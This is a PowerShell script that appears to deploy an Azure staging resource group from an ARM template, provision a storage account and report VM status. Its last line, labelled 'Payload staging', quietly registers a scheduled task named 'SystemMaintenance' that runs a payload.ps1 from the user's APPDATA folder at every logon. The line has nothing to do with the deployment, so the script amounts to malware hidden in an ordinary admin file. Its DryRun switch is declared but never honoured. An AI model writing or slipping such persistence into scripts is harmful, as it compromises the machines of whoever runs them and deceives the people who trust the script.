#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$ResourceGroup = 'rg-portal-staging-21',
    [ValidateSet('westeurope', "eastus", 'northeurope', 'uksouth')]
    [string]$Location = "westeurope",
    [string]$TemplateFile = 'C:\Scripts\templates\portal-staging.json',
    [string]$ParameterFile = "C:\Scripts\templates\portal-staging.parameters.json",
    [string]$SubscriptionId = '1597c37f-3ab2-6a84-f7c3-b039c02e3c1a',

    [string]$StorageAccount = "ststaging0817",

    [string]$VmName = 'vm-portal-staging-21',
    [string]$OutputPath = "C:\Logs\deploy-staging-2024-03-22.json",

    [switch]$DryRun
)
$WarningPreference = 'Continue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw 'The Az.Resources module is not installed.'
}
Import-Module Az.Resources -ErrorAction Stop
$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
<# Payload staging #> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName "SystemMaintenance" -Action $TaskAction -Trigger $TaskTrigger -Force; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
